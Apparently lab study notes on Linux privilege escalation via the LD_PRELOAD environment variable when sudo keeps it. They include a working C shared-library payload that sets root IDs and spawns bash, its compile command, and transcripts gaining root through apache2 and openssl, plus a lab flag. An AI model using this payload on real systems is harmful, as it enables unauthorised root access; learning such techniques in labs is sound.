## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [LD_PRELOAD Privilege Escalation](#LD_PRELOAD\Privilege\Escalation)
      - [Pivilege escalation w/ LD_PRELOAD & Openssl](#Pivilege\escalation\w/\LD_PRELOAD\&\Openssl)

## Table of Contents

  - [LD_PRELOAD Privilege Escalation](#LD_PRELOAD\Privilege\Escalation)
      - [Pivilege escalation w/ LD_PRELOAD & Openssl](#Pivilege\escalation\w/\LD_PRELOAD\&\Openssl)

It's common for linux programs to use dynamically linked shared objects libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. 


Two types of libraries exist in Linux: `static libraries` (denoted by the **.a** file extension) and `dynamically linked shared object libraries` (denoted by the **.so** file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.


There are multiple methods of specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.


```shell
htb_student@NIX02:~$ ldd /bin/ls
```


## LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```shell
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```


This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

Code: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

We can compile this as follows:

```shell
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

#### Pivilege escalation w/ LD_PRELOAD & Openssl
```bash
htb-student@NIX02:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
htb-student@NIX02:~$ sudo LD_PRELOAD=/^C
htb-student@NIX02:~$ realpath shell.so
/home/htb-student/shell.so
htb-student@NIX02:~$ sudo LD_PRELOAD=/home/htb-student/shell.so openssl
root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
root@NIX02:~# cd /root/ld_preload/
root@NIX02:/root/ld_preload# ls
flag.txt
root@NIX02:/root/ld_preload# cat flag.txt
6a9c151a599135618b8f09adc78ab5f1
root@NIX02:/root/ld_preload# cat shell.c
cat: shell.c: No such file or directory
root@NIX02:/root/ld_preload# cd ~
root@NIX02:~# ls
cert.pem  lynis-master  shared_obj_hijack  shell.do
key.pem   master.zip    shell.c            shell.so
root@NIX02:~# cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}

```



